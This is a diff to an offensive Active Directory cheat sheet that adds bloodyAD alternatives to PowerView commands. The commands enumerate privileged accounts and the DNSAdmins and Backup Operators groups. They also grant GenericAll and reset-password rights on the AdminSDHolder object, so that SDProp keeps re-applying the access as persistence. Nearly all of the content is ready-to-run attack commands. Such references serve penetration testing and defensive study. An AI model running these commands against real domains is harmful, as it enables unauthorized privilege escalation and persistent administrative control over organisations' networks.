@@ -8,8 +8,10 @@ If you do not want modified ACLs to be overwritten every hour, you should change
 
 Find users with `AdminCount=1`.
 
-```powershell
+```ps1
 crackmapexec ldap 10.10.10.10 -u username -p password --admin-count
+# or
+bloodyAD --host 10.10.10.10 -d example.lab -u john -p pass123 get search --filter '(admincount=1)' --attr sAMAccountName
 # or
 python ldapdomaindump.py -u example.com\john -p pass123 -d ';' 10.10.10.10
 jq -r '.[].attributes | select(.adminCount == [1]) | .sAMAccountName[]' domain_users.json
@@ -27,17 +29,24 @@ Get-ADGroup -LDAPFilter "(objectcategory=group) (admincount=1)"
 
 If you modify the permissions of **AdminSDHolder**, that permission template will be pushed out to all protected accounts automatically by `SDProp` (in an hour).
 E.g: if someone tries to delete this user from the Domain Admins in an hour or less, the user will be back in the group.
+* Windows/Linux:
+  ```ps1
+  bloodyAD --host 10.10.10.10 -d example.lab -u john -p pass123 add genericAll 'CN=AdminSDHolder,CN=System,DC=example,DC=lab' john
 
-```powershell
-# Add a user to the AdminSDHolder group:
-Add-DomainObjectAcl -TargetIdentity 'CN=AdminSDHolder,CN=System,DC=domain,DC=local' -PrincipalIdentity username -Rights All -Verbose
+  # Clean up after
+  bloodyAD --host 10.10.10.10 -d example.lab -u john -p pass123 remove genericAll 'CN=AdminSDHolder,CN=System,DC=example,DC=lab' john
+  ```
+* Windows only:
+  ```ps1
+  # Add a user to the AdminSDHolder group:
+  Add-DomainObjectAcl -TargetIdentity 'CN=AdminSDHolder,CN=System,DC=domain,DC=local' -PrincipalIdentity username -Rights All -Verbose
 
-# Right to reset password for toto using the account titi
-Add-ObjectACL -TargetSamAccountName toto -PrincipalSamAccountName titi -Rights ResetPassword
+  # Right to reset password for toto using the account titi
+  Add-ObjectACL -TargetSamAccountName toto -PrincipalSamAccountName titi -Rights ResetPassword
 
-# Give all rights
-Add-ObjectAcl -TargetADSprefix 'CN=AdminSDHolder,CN=System' -PrincipalSamAccountName toto -Verbose -Rights All
-```
+  # Give all rights
+  Add-ObjectAcl -TargetADSprefix 'CN=AdminSDHolder,CN=System' -PrincipalSamAccountName toto -Verbose -Rights All
+  ```
 
 
 ## DNS Admins Group
@@ -47,6 +56,11 @@ Add-ObjectAcl -TargetADSprefix 'CN=AdminSDHolder,CN=System' -PrincipalSamAccount
 :warning: Require privileges to restart the DNS service.
 
 * Enumerate members of DNSAdmins group
+  * Windows/Linux:
+    ```ps1
+    bloodyAD --host 10.10.10.10 -d example.lab -u john -p pass123 get object DNSAdmins --attr msds-memberTransitive
+    ```
+  * Windows only:
     ```ps1
     Get-NetGroupMember -GroupName "DNSAdmins"
     Get-ADGroupMember -Identity DNSAdmins
@@ -86,9 +100,14 @@ This groups grants the following privileges :
 - SeRestore privileges
 
 * Get members of the group:
-  ```ps1
-  PowerView> Get-NetGroupMember -Identity "Backup Operators" -Recurse
-  ```
+  * Windows/Linux:
+    ```ps1
+    bloodyAD --host 10.10.10.10 -d example.lab -u john -p pass123 get object "Backup Operators" --attr msds-memberTransitive
+    ```
+  * Windows only:
+    ```ps1
+    PowerView> Get-NetGroupMember -Identity "Backup Operators" -Recurse
+    ```
 * Enable privileges using [giuliano108/SeBackupPrivilege](https://github.com/giuliano108/SeBackupPrivilege)
   ```ps1
   Import-Module .\SeBackupPrivilegeUtils.dll
